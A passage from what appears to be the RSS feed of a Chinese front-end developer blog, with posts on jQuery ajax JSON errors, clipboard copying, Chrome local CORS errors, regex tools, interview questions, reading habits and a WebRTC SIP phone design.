&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-nginx做反向代理是需要注意的问题&#34;&gt;2. NGINX做反向代理是需要注意的问题&lt;/h1&gt;
&lt;p&gt;如果排除所有问题后，那剩下的问题可以考虑出在反向代理上，一下有几点是可以考虑的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>状态码为200时 jQuery ajax报错</title>
      <link>https://wdd.js.org/posts/2018/03/status-code-200-jquery-ajax-failed/</link>
      <pubDate>Thu, 15 Mar 2018 14:17:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/03/status-code-200-jquery-ajax-failed/</guid>
      <description>&lt;h1 id=&#34;1-问题现象&#34;&gt;1. 问题现象&lt;/h1&gt;
&lt;p&gt;HTTP 状态码为 200 OK 时， jquery ajax报错&lt;/p&gt;
&lt;h1 id=&#34;2-问题原因&#34;&gt;2. 问题原因&lt;/h1&gt;
&lt;p&gt;jquery ajax的dataType字段包含：json, 但是服务端返回的数据不是规范的json格式，导致jquery解析json字符串报错，最终导致ajax报错。&lt;/p&gt;
&lt;p&gt;jQuery ajax 官方文档上说明：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;json&amp;rdquo;: Evaluates the response as JSON and returns a JavaScript object. Cross-domain &amp;ldquo;json&amp;rdquo; requests are converted to &amp;ldquo;jsonp&amp;rdquo; unless the request includes jsonp: false in its request options. The JSON data is parsed in a strict manner; any malformed JSON is rejected and a parse error is thrown. As of jQuery 1.9, an empty response is also rejected; the server should return a response of null or {} instead. (See json.org for more information on proper JSON formatting.)&lt;/p&gt;</description>
    </item>
    <item>
      <title>前端剪贴板复制功能实现原理</title>
      <link>https://wdd.js.org/posts/2018/03/clipboard-copy-tutorial/</link>
      <pubDate>Wed, 14 Mar 2018 14:19:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/03/clipboard-copy-tutorial/</guid>
      <description>&lt;h1 id=&#34;1-兼容情况&#34;&gt;1. 兼容情况&lt;/h1&gt;
&lt;p&gt;如果想浏览器支持粘贴功能，那么浏览器必须支持，&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand&#34;&gt;document.execCommand(&amp;lsquo;copy&amp;rsquo;)&lt;/a&gt;方法，也可以根据&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/Document/queryCommandSupported&#34;&gt;document.queryCommandEnabled(&amp;lsquo;copy&amp;rsquo;)&lt;/a&gt;，返回的true或者false判断浏览器是否支持copy命令。&lt;/p&gt;
&lt;p&gt;从下表可以看出，主流的浏览器都支持execCommand命令&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180314142213_IhrFsz_Jietu20180314-141253.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-复制的原理&#34;&gt;2. 复制的原理&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;查询元素&lt;/li&gt;
&lt;li&gt;选中元素&lt;/li&gt;
&lt;li&gt;执行复制命令&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;3-代码展示&#34;&gt;3. 代码展示&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// html
&amp;lt;input id=&amp;#34;username&amp;#34; value=&amp;#34;123456&amp;#34;&amp;gt;

// 查询元素
var username = document.getElementById(‘username’)

// 选中元素
username.select()

// 执行复制
document.execCommand(&amp;#39;copy&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;注意: 以上代码只是简单示意，在实践过程中还有几个要判断的情况&lt;/p&gt;&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;首要要去检测浏览器execCommand能力检测&lt;/li&gt;
&lt;li&gt;选取元素时，有可能选取元素为空，要考虑这种情况的处理&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;4-第三方方案&#34;&gt;4. 第三方方案&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://clipboardjs.com/&#34;&gt;clipboard.js&lt;/a&gt;是一个比较方便的剪贴板库，功能蛮多的。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!-- Target --&amp;gt;
&amp;lt;textarea id=&amp;#34;bar&amp;#34;&amp;gt;Mussum ipsum cacilds...&amp;lt;/textarea&amp;gt;

&amp;lt;!-- Trigger --&amp;gt;
&amp;lt;button class=&amp;#34;btn&amp;#34; data-clipboard-action=&amp;#34;cut&amp;#34; data-clipboard-target=&amp;#34;#bar&amp;#34;&amp;gt;
    Cut to clipboard
&amp;lt;/button&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;官方给的代码里有上面的一个示例，如果你用了这个示例，但是不起作用，那你估计是没有初始化ClipboardJS示例的。&lt;/p&gt;
&lt;p&gt;注意：下面的函数必须要主动调用，这样才能给响应的DOM元素注册事件。 ClipboardJS源代码压缩后大约有3kb，虽然很小了，但是如果你不需要它的这么多功能的话，其实你自己写几行代码就可以搞定复制功能。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;new ClipboardJS(&amp;#39;.btn&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Chrome本地跨域origin-null-is-not-allowed问题分析与解决方案</title>
      <link>https://wdd.js.org/posts/2018/03/origin-null-is-not-allowed/</link>
      <pubDate>Fri, 09 Mar 2018 17:58:05 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/03/origin-null-is-not-allowed/</guid>
      <description>&lt;h1 id=&#34;1-问题表现&#34;&gt;1. 问题表现&lt;/h1&gt;
&lt;p&gt;以&lt;code&gt;file:///xxx.html&lt;/code&gt;打开某个html文件，发送ajax请求时报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Response to preflight request doesn&amp;#39;t pass access control check: The &amp;#39;Access-Control-Allow-Origin&amp;#39; header has a value &amp;#39;null&amp;#39; that is not equal to the supplied origin. Origin &amp;#39;null&amp;#39; is therefore not allowed access.
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-问题原因&#34;&gt;2. 问题原因&lt;/h1&gt;
&lt;p&gt;Origin null是本地文件系统，因此这表明您正在加载通过file：// URL进行加载调用的HTML页面（例如，只需在本地文件浏览器或类似文件中双击它）。不同的浏览器采用不同的方法将相同来源策略应用到本地文件。&lt;code&gt;Chrome要求比较严格，不允许这种形势的跨域请求。&lt;/code&gt;而最好使用http:// 访问html.&lt;/p&gt;
&lt;h1 id=&#34;3-解决方案&#34;&gt;3. 解决方案&lt;/h1&gt;
&lt;p&gt;以下给出三个解决方案，第一个最快，第三个作为彻底。&lt;/p&gt;
&lt;h2 id=&#34;31-方案1-给chrome快捷方式中增加---allow-file-access-from-files&#34;&gt;3.1. 方案1 给Chrome快捷方式中增加 &amp;ndash;allow-file-access-from-files&lt;/h2&gt;
&lt;p&gt;打开Chrome快捷方式的属性中设置：右击Chrome浏览器快捷方式，选择“属性”，在“目标”中加&amp;quot;&amp;ndash;allow-file-access-from-files&amp;quot;，注意前面有个空格，重启Chrome浏览器便可。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180309181105_SUxYRg_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;32-方案2-启动一个简单的静态文件服务器-以http协议访问html&#34;&gt;3.2. 方案2 启动一个简单的静态文件服务器, 以http协议访问html&lt;/h2&gt;
&lt;p&gt;参见我的这篇文章: &lt;a href=&#34;https://wdd.js.org/one-command-create-static-file-server.html&#34;&gt;一行命令搭建简易静态文件http服务器&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;33-方案3-服务端响应修改access-control-allow-origin--&#34;&gt;3.3. 方案3 服务端响应修改Access-Control-Allow-Origin : *&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;response.addHeader(&amp;#34;Access-Control-Allow-Origin&amp;#34;,&amp;#34;*&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-参考文章&#34;&gt;4. 参考文章&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.csdn.net/dandanzmc/article/details/31344267&#34;&gt;如何解决XMLHttpRequest cannot load file~~~~~~~Origin &amp;rsquo;null&amp;rsquo; is therefore not allowed access&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.csdn.net/kissliux/article/details/16889111&#34;&gt;让chrome支持本地Ajax请求,Ajax请求status cancel Origin null is not allowed by Access-Control-Allow-Origin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/8456538/origin-null-is-not-allowed-by-access-control-allow-origin&#34;&gt;Origin null is not allowed by Access-Control-Allow-Origin
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>正则表达式在线工具集合</title>
      <link>https://wdd.js.org/posts/2018/02/regex-online-tools/</link>
      <pubDate>Sat, 24 Feb 2018 15:27:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/regex-online-tools/</guid>
      <description>&lt;h1 id=&#34;1-功能最强regex101httpsregex101com&#34;&gt;1. 功能最强：&lt;a href=&#34;https://regex101.com/&#34;&gt;regex101&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持多种语言, prec,php,javascript,python,golang&lt;/li&gt;
&lt;li&gt;界面美观大方&lt;/li&gt;
&lt;li&gt;支持错误提示，实时匹配&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有时候加载速度太慢&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180224153235_7QYNUW_Jietu20180224-153227.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-可视化正则绘图-regulexhttpsjeximregulex&#34;&gt;2. 可视化正则绘图: &lt;a href=&#34;https://jex.im/regulex/&#34;&gt;Regulex&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实时根据正则表达式绘图&lt;/li&gt;
&lt;li&gt;页面加载速度快&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180224153440_Z2JC4M_Jietu20180224-153432.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-可视化正则绘图regexperhttpsregexpercom2f5bf5d2f&#34;&gt;3. 可视化正则绘图：&lt;a href=&#34;https://regexper.com/#%2F%5Bf%5D%2F&#34;&gt;regexper&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据正则表达式绘图&lt;/li&gt;
&lt;li&gt;页面加载速度快&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无法实时绘图，需要点击才可以&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180224153957_KAVhWs_Jietu20180224-153944.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-专注于python正则pyregexhttpwwwpyregexcom&#34;&gt;4. 专注于python正则：&lt;a href=&#34;http://www.pyregex.com/&#34;&gt;pyregex&lt;/a&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;专注python&lt;/li&gt;
&lt;li&gt;页面加载速度快&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180224153711_pNQ236_Jietu20180224-153703.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>前端面试和笔试题目</title>
      <link>https://wdd.js.org/posts/2018/02/front-end-interview-handbook/</link>
      <pubDate>Fri, 23 Feb 2018 15:18:26 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/front-end-interview-handbook/</guid>
      <description>&lt;h1 id=&#34;1-问答题&#34;&gt;1. 问答题&lt;/h1&gt;
&lt;h2 id=&#34;11-html相关&#34;&gt;1.1. HTML相关&lt;/h2&gt;
&lt;h3 id=&#34;111-doctype-html的作用是什么&#34;&gt;1.1.1. &lt;!-- raw HTML omitted --&gt;的作用是什么？&lt;/h3&gt;
&lt;h3 id=&#34;112-script-script-async和script-defer之间有什么区别&#34;&gt;1.1.2. script, script async和script defer之间有什么区别？&lt;/h3&gt;
&lt;h3 id=&#34;113-cookie-sessionstorage-和-localstorage之间有什么区别&#34;&gt;1.1.3. cookie, sessionStorage 和 localStorage之间有什么区别？&lt;/h3&gt;
&lt;h3 id=&#34;114-用过哪些html模板渲染工具&#34;&gt;1.1.4. 用过哪些html模板渲染工具？&lt;/h3&gt;
&lt;h2 id=&#34;12-css相关&#34;&gt;1.2. CSS相关&lt;/h2&gt;
&lt;h3 id=&#34;121-简述css盒子模型&#34;&gt;1.2.1. 简述CSS盒子模型&lt;/h3&gt;
&lt;h3 id=&#34;122-css有哪些选择器&#34;&gt;1.2.2. CSS有哪些选择器？&lt;/h3&gt;
&lt;h3 id=&#34;123-css-sprite是什么&#34;&gt;1.2.3. CSS sprite是什么？&lt;/h3&gt;
&lt;h3 id=&#34;124-写一下你知道的前端ui框架&#34;&gt;1.2.4. 写一下你知道的前端UI框架？&lt;/h3&gt;
&lt;h2 id=&#34;13-js相关&#34;&gt;1.3. JS相关&lt;/h2&gt;
&lt;h3 id=&#34;131-js有哪些数据类型&#34;&gt;1.3.1. js有哪些数据类型？&lt;/h3&gt;
&lt;h3 id=&#34;132-js有哪些假值&#34;&gt;1.3.2. js有哪些假值？&lt;/h3&gt;
&lt;h3 id=&#34;133-js数字和字符串之间有什么快速转换的写法&#34;&gt;1.3.3. js数字和字符串之间有什么快速转换的写法？&lt;/h3&gt;
&lt;h3 id=&#34;134-经常使用哪些es6的语法&#34;&gt;1.3.4. 经常使用哪些ES6的语法？&lt;/h3&gt;
&lt;h3 id=&#34;135-什么是同源策略&#34;&gt;1.3.5. 什么是同源策略？&lt;/h3&gt;
&lt;h3 id=&#34;136-跨域有哪些解决方法&#34;&gt;1.3.6. 跨域有哪些解决方法？&lt;/h3&gt;
&lt;h3 id=&#34;137-网页进度条实现的原理&#34;&gt;1.3.7. 网页进度条实现的原理&lt;/h3&gt;
&lt;h3 id=&#34;138-请问consolelog是同步的还是异步的&#34;&gt;1.3.8. 请问console.log是同步的，还是异步的？&lt;/h3&gt;
&lt;h3 id=&#34;139-下面console输出的值是什么&#34;&gt;1.3.9. 下面console输出的值是什么？&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var scores = [10,11,12];
var total = 0;

for(var score in scores){
  total += score;
}

var average = total/scores.length;
console.log(average);
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;1310-请问下面的写法问题在哪&#34;&gt;1.3.10. 请问下面的写法问题在哪？&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;console.log(1)

(function(){
    console.log(1)
})()
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;1311-请问slength是多少s2是多少&#34;&gt;1.3.11. 请问s.length是多少，s[2]是多少&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var s = []
s[3] = 4

s.length ?
s[2] ?
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;1312-说说你对settimeout的深入理解&#34;&gt;1.3.12. 说说你对setTimeout的&lt;code&gt;深入&lt;/code&gt;理解？&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;setTimeout(function(){
  console.log(&amp;#39;hi&amp;#39;)
}, 1000)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;1313-解释闭包概念及其作用&#34;&gt;1.3.13. 解释闭包概念及其作用&lt;/h3&gt;
&lt;h3 id=&#34;1314-如何理解js-函数first-class的概念&#34;&gt;1.3.14. 如何理解js 函数&lt;code&gt;first class&lt;/code&gt;的概念？&lt;/h3&gt;
&lt;h3 id=&#34;1315-函数有哪些调用方式不同this的会指向哪里&#34;&gt;1.3.15. 函数有哪些调用方式？不同this的会指向哪里？&lt;/h3&gt;
&lt;h3 id=&#34;1316-applly和call有什么区别&#34;&gt;1.3.16. applly和call有什么区别？&lt;/h3&gt;
&lt;h3 id=&#34;1317-函数的length属性的代表什么&#34;&gt;1.3.17. 函数的length属性的代表什么？&lt;/h3&gt;
&lt;h3 id=&#34;1318-有用过哪些js编程风格&#34;&gt;1.3.18. 有用过哪些js编程风格&lt;/h3&gt;
&lt;h3 id=&#34;1319-如何理解eventloop&#34;&gt;1.3.19. 如何理解EventLoop?&lt;/h3&gt;
&lt;h3 id=&#34;1320-使用过哪些构建工具各有什么优缺点&#34;&gt;1.3.20. 使用过哪些构建工具？各有什么优缺点？&lt;/h3&gt;
&lt;h2 id=&#34;14-其它&#34;&gt;1.4. 其它&lt;/h2&gt;
&lt;h3 id=&#34;141-平时使用什么搜索引擎查资料&#34;&gt;1.4.1. 平时使用什么搜索引擎查资料？&lt;/h3&gt;
&lt;h3 id=&#34;142-对翻墙有什么看法如何翻墙&#34;&gt;1.4.2. 对翻墙有什么看法？如何翻墙？&lt;/h3&gt;
&lt;h3 id=&#34;143-个人有没有技术博客地址是什么&#34;&gt;1.4.3. 个人有没有技术博客，地址是什么？&lt;/h3&gt;
&lt;h3 id=&#34;144-github上有没有项目&#34;&gt;1.4.4. github上有没有项目？&lt;/h3&gt;
&lt;h2 id=&#34;15-网络相关&#34;&gt;1.5. 网络相关&lt;/h2&gt;
&lt;h3 id=&#34;151-请求状态码-1xx2xx3xx4xx5xx分别有什么含义&#34;&gt;1.5.1. 请求状态码 1xx,2xx,3xx,4xx,5xx分别有什么含义？&lt;/h3&gt;
&lt;h3 id=&#34;152-发送某些post请求时有时会多一些options请求请问这是为什么&#34;&gt;1.5.2. 发送某些post请求时，有时会多一些options请求，请问这是为什么？&lt;/h3&gt;
&lt;h3 id=&#34;153-http报文有哪些组成部分&#34;&gt;1.5.3. http报文有哪些组成部分？&lt;/h3&gt;
&lt;h3 id=&#34;154-http端到端首部和逐跳首部有什么区别&#34;&gt;1.5.4. http端到端首部和逐跳首部有什么区别？&lt;/h3&gt;
&lt;h3 id=&#34;155-http与https在同时使用时有什么注意点&#34;&gt;1.5.5. http与https在同时使用时，有什么注意点？&lt;/h3&gt;
&lt;h3 id=&#34;156-http-tcp-udp-websocket分别位于7层网络的那一层tcp和udp有什么不同&#34;&gt;1.5.6. http, tcp, udp, websocket，分别位于7层网络的那一层？tcp和udp有什么不同？&lt;/h3&gt;
&lt;h1 id=&#34;2-编码题&#34;&gt;2. 编码题&lt;/h1&gt;
&lt;h2 id=&#34;21-写一个函数返回一个数组中所有元素被第一个元素除后的结果&#34;&gt;2.1. 写一个函数，返回一个数组中所有元素被第一个元素除后的结果&lt;/h2&gt;
&lt;h2 id=&#34;22-写一个函数来判断变量是否是数组至少使用两种写法&#34;&gt;2.2. 写一个函数，来判断变量是否是数组，至少使用两种写法&lt;/h2&gt;
&lt;h2 id=&#34;23-写一个函数将秒转化成时分秒格式如80转化成000120&#34;&gt;2.3. 写一个函数，将秒转化成时分秒格式，如80转化成：00:01:20&lt;/h2&gt;
&lt;h2 id=&#34;写一个函数将对象中属性值为-undefined-null的属性删除掉&#34;&gt;写一个函数，将对象中属性值为&amp;rsquo;&amp;rsquo;, undefined, null的属性删除掉&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 处理前
var obj = {
  name: &amp;#39;wdd&amp;#39;,
  address: {
    code: &amp;#39;&amp;#39;,
    tt: null,
    age: 1
  },
  ss: [],
  vv: undefined
}

// 处理后
{
  name: &amp;#39;wdd&amp;#39;,
  address: {
    age: 1
  },
  ss: []
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-翻译题&#34;&gt;3. 翻译题&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Aggregation operations process data records and return computed results. Aggregation operations group values from multiple documents together, and can perform a variety of operations on the grouped data to return a single result. MongoDB provides three ways to perform aggregation: the aggregation pipeline, the map-reduce function, and single purpose aggregation methods.&lt;/p&gt;</description>
    </item>
    <item>
      <title>small is better than big 我的读书方法论</title>
      <link>https://wdd.js.org/posts/2018/02/small-is-better-than-big/</link>
      <pubDate>Tue, 13 Feb 2018 14:57:23 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/small-is-better-than-big/</guid>
      <description>&lt;h1 id=&#34;床底下秘密&#34;&gt;床底下秘密&lt;/h1&gt;
&lt;p&gt;我是一个毅力不是很够的人。我曾经下定决心要锻炼身体，买了一些健身器材，例如瑜伽垫，仰卧起坐的器材，俯卧撑的器材。然而三分钟的热度过后，我把瑜伽垫卷了起来，塞到床底下。把仰卧起坐的器材拆开，也塞到了床底下。&lt;/p&gt;
&lt;p&gt;所以每次我都不敢看床底下，那里塞满了我的羞愧。我常常想，我这不就是永远睡在羞愧之上吗？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;那么，是什么让我放弃了自己的目标，慢慢活成了自己讨厌的样子呢？&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之前和朋友聊天，我们有一段时间没见了。我突然觉得他也太能聊了，说了很多我不知道的新鲜事，还有一些可以让人茅塞顿开的想法。完了之后，他劝我让我多读书。我觉得这个想法很多。我是确实需要读书了。毕竟我的床底下已经没有空间再塞其他的东西了。&lt;/p&gt;
&lt;p&gt;于是我在多看阅读上买了一下电子书，在京东上买了一些实体书，然后又买了一个kindle。在读书的过程中，有时候作者也会推荐你看一些其他的书。我给自己定了&lt;a href=&#34;https://wdd.js.org/2018-reading-plan.html&#34;&gt;2018年我的阅读计划&lt;/a&gt;，给自己定下要看哪些书。&lt;/p&gt;
&lt;h1 id=&#34;看书的方法&#34;&gt;看书的方法&lt;/h1&gt;
&lt;p&gt;当我决定要看书，并且为此付出了不少的金钱的情况下。我是非常不愿因让我的金钱的付出白白打水漂的，毕竟买书以及买设备，这不是免费的服务。于是我给自己指定了一个非常完善的定量阅读标准&lt;/p&gt;
&lt;p&gt;读书方法v1.0.0 版 如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每天至少看三本书&lt;/li&gt;
&lt;li&gt;每本书看50页&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;人要有标准才能判断是否达标，没有标准，没有数字化的支撑，那是很难以持续的。比如说中国的菜谱，做某道菜中写了一句：&lt;code&gt;加入少许盐&lt;/code&gt;。中国人看了会想，那我就按照口味随便加点盐吧。外国人就会被搞得非常迷糊，少许是多少克盐？ 20g, 30g? 完全没有标准嘛。&lt;/p&gt;
&lt;p&gt;按照读书方法 v1.0.0版，我看了几天，这个效果是很好的。但是我很累，电子书50页可不是个小数目。有时候很难完成的。于是我必须要升级我的读书方法。&lt;/p&gt;
&lt;p&gt;读书方法v1.0.1 版 如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每天至少看三本书&lt;/li&gt;
&lt;li&gt;每本书看10页&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;按照读书方法v1.0.1 版，我看了几天，虽然读书的进度很慢，但是我很容易有满足感，因为这个目标是很容易就达成的。因为你随便去上个厕所，看个10页电子书也是绰绰有余的。但是这个版本也有个问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果我今天看的这本书看的流连忘返，一不小心忘记看页码了，居然不知不觉读了38页，那么是不是已经消耗了未来几天的阅读量呢，明天这本书要不要度呢？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以，我要升级我的读书方法。&lt;/p&gt;
&lt;p&gt;读书方法v1.0.2版：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每天至少读三本书&lt;/li&gt;
&lt;li&gt;每本书至少读10页&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我按照这个方法，感觉做的不错。每天都有一定的阅读量要看，而且阅读量不是很大，不会让我觉得很累。而且当我完成了这个目标，我是会获得不小的满足感。&lt;/p&gt;
&lt;p&gt;大目标分解成小目标去逐个击破，这是我这篇文章的核心观点。&lt;/p&gt;
&lt;h1 id=&#34;冲量公式-i--f-x-t&#34;&gt;冲量公式 I = F x T&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;冲量是力的时间累积效应的量度，是矢量。如果物体所受的力是大小和方向都不变的恒力F，冲量I就是F和作用时间t的乘积。
冲量是描述力对物体作用的时间累积效应的物理量。力的冲量是一个过程量。在谈及冲量时，必须明确是哪个力在哪段时间上的冲量。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;个人好习惯的养成，不是一蹴而就的，而是类似于物理学冲量的概念：力在一段时间内的累积，是过程量&lt;/p&gt;
&lt;p&gt;三分钟的热度对应的冲量：I = F_max x T_min。使用很大的力，作用时间超短，基本上没啥效果，冲量趋近于零。&lt;/p&gt;
&lt;p&gt;微习惯对应的冲量：I = F_min x T_max。使用很小的力，做长时间的积累。冲量不会趋近于零，而是会慢慢增长，然后趋近于一个稳定水平。比如你给自己规定每天看1页书，但是大多数情况下，如果你做了看书的动作，基本上你看书的页数一定会大于1页。&lt;/p&gt;
&lt;h1 id=&#34;看什么样的书&#34;&gt;看什么样的书&lt;/h1&gt;
&lt;p&gt;我自己喜欢看计算机，心理学，历史人文方面的出版书籍。而我的选择标准有两个，符合任一一个，我都会去看。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;要有用。无论是对我的专业知识，还是对人际交往，金融理财等方面要用有益之处&lt;/li&gt;
&lt;li&gt;要有趣。没趣的书我是断然不会去看的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;读书实际上是读人，一流作家写的一流的书，三流作家只能写出九流的书。&lt;/p&gt;</description>
    </item>
    <item>
      <title>基于 WebRTC 构建 Web SIP Phone</title>
      <link>https://wdd.js.org/posts/2018/02/webrtc-web-sip-phone/</link>
      <pubDate>Sun, 11 Feb 2018 14:44:58 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/webrtc-web-sip-phone/</guid>
      <description>&lt;h1 id=&#34;0-阅前须知&#34;&gt;0 阅前须知&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;本文并不是教程，只是实现方案&lt;/li&gt;
&lt;li&gt;我只是从WEB端考虑这个问题，实际还需要后端sip服务器的配合&lt;/li&gt;
&lt;li&gt;jsSIP有个非常不错的在线demo, 可以去哪里玩耍，很好玩呢 &lt;a href=&#34;https://tryit.jssip.net/&#34;&gt;try jssip &lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211144554_nUwjgc_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-技术简介&#34;&gt;1. 技术简介&lt;/h1&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;WebRTC&lt;/code&gt;: WebRTC，名称源自&lt;code&gt;网页即时通信&lt;/code&gt;（英语：Web Real-Time Communication）的缩写，是一个支持网页浏览器进行实时语音对话或视频对话的API。它于2011年6月1日开源并在Google、Mozilla、Opera支持下被纳入万维网联盟的W3C推荐标准&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SIP&lt;/code&gt;: &lt;code&gt;会话发起协议&lt;/code&gt;（Session Initiation Protocol，缩写SIP）是一个由IETF MMUSIC工作组开发的协议，作为标准被提议用于创建，修改和终止包括视频，语音，即时通信，在线游戏和虚拟现实等多种多媒体元素在内的交互式用户会话。2000年11月，SIP被正式批准成为3GPP信号协议之一，并成为IMS体系结构的一个永久单元。SIP与H.323一样，是用于VoIP最主要的信令协议之一。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211144604_Zdxh2x_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;一般来说，要么使用实体话机，要么在系统上安装基于sip的客户端程序。实体话机硬件成本高，基于sip的客户端往往兼容性差，无法跨平台，易被杀毒软件查杀。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;WebRTC&lt;/code&gt;或许是更好的解决方案，只要一个浏览器就可以实时语音视频通话，这是很不错的解决方案。WebSocket可以用来传递sip信令，而WebRTC用来实时传输语音视频流。&lt;/p&gt;
&lt;h1 id=&#34;2-前端webrtc实现方案&#34;&gt;2. 前端WebRTC实现方案&lt;/h1&gt;
&lt;p&gt;其实我们不需要去自己处理WebRTC的相关方法，或者去处理视频或者媒体流。市面上已经有不错的模块可供选择。&lt;/p&gt;
&lt;h2 id=&#34;21-jssiphttpjssipnet&#34;&gt;2.1 &lt;a href=&#34;http://jssip.net/&#34;&gt;jsSIP&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;jsSIP是JavaScript SIP 库&lt;/code&gt;&lt;/p&gt;
